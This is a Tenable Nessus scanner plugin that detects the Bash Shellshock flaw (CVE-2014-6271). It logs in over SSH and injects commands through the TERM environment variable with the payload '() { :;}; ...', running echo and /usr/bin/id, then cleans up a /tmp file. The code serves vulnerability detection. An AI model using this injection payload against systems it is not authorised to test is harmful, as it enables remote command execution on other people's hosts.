#TRUSTED 42c01cf56970df2d97c94ae42cc54bf21c14fbfcf54544f16e0d1e798923d5217d09edcb3fa48d6bd0c8ceb53474c04cbe2736dc6c0da960a57edfef81c6be9ed8fa153899031c7047bb3637ba8c50d9cefee013a46802ab854b296105922c1d60f32e7c53b9e2b51ac295adad1f7355c31aa14758c12b1f877ec09d5d46183823427451bc3e5569d0efe48c748cc96c1fb9ede073c2ba4461c83b5312ece7496d9ab0e005fbc4ccb33e5521cb0278672f12dc8ee589883cc1b2d1ad49cb6492e74a17024748b2cb92b77b16a787f27a32cd257307bcc1c942d819ecc84c092f8d6cbbb46f151efe8d4c8e5174479c2875a59b21a04c094fc57253161fd5b5a82424036dd7652d6647dfc6621dd5825a0ccfbb2af8b9f1f94d3131ca28ad46d21481248d02252e21ad421ce9cfe006ec5eebb27c67259aff3b5a46677a5eec986ea13d573a18d9cd71e2cab25d61afdda014426589e3761f6904836408b53442bf47e81968f3aa14ffca760dd45bba3ecf4d40441a990750b5f63cd43d1c298c5311df2f3b9d69ef6d2ca8a7ce9513e6d468ad9d239888a26462bfce8454687c9349e156eb01b27d13d106249cbcf4ff020693601b95bca953e152def827d0045416aa00a9aec2673094dd8ed405df4975709881619d45575cdb8d67fc210c10f634a7dde522e21280c08c9f662d08818a33c5da5bd586f62a96ee59b049748b
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(77823);
  script_version("1.14");
  script_set_attribute(attribute:"plugin_modification_date", value:"2017/04/25");

  script_cve_id("CVE-2014-6271");
  script_bugtraq_id(70103);
  script_osvdb_id(112004);
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34766");

  script_name(english:"Bash Remote Code Execution (Shellshock)");
  script_summary(english:"Logs in with SSH.");

  script_set_attribute(attribute:"synopsis", value:"A system shell on the remote host is vulnerable to command injection.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Bash that is vulnerable to
command injection via environment variable manipulation. Depending on
the configuration of the system, an attacker could remotely execute
arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:"Update Bash.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Pure-FTPd External Authentication Bash Environment Variable Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"agent", value:"unix");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("ssh_get_info.nasl");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("ssh_func.inc");
include("telnet_func.inc");
include("hostlevel_funcs.inc");
include("misc_func.inc");

port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

ret = ssh_open_connection();
if (!ret) audit(AUDIT_SOCK_FAIL, port, "SSH");

info_t = INFO_SSH;

filename = "nessus." + unixtime();

test_command = "echo Plugin output: $((1+1))";
term = "() { :;}; " + test_command + " > /tmp/" + filename;
command = "bash -c 'cat /tmp/" + filename + "'";
output = ssh_cmd(cmd:command, term:term, noexec:TRUE);
# attempt cleanup
cleanup = "rm /tmp/" + filename;
ssh_cmd(cmd:cleanup);

if ("Plugin output: 2" >!< output) audit(AUDIT_HOST_NOT, "affected.");

test_command = "/usr/bin/id";
term2 = "() { :;}; " + test_command + " > /tmp/" + filename;
command = "bash -c 'cat /tmp/" + filename + "'";
output2 = ssh_cmd(cmd:command, term:term2, noexec:TRUE);
# attempt cleanup
cleanup = "rm /tmp/" + filename;
ssh_cmd(cmd:cleanup);

if (output2 =~ "uid=[0-9]+.*gid=[0-9]+.*")
{
  term = term2;
  output = output2;
}

if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus was able to set the TERM environment variable used in an SSH' +
    '\n' + 'connection to :' +
    '\n' +
    '\n' + term +
    '\n' +
    '\n' + 'and read the output from the file :' +
    '\n' +
    '\n' + output +
    '\n' +
    '\n' + 'Note: Nessus has attempted to remove the file /tmp/' + filename + '\n';
  security_hole(port:port, extra:report);
  exit(0);
}
else security_hole(port);
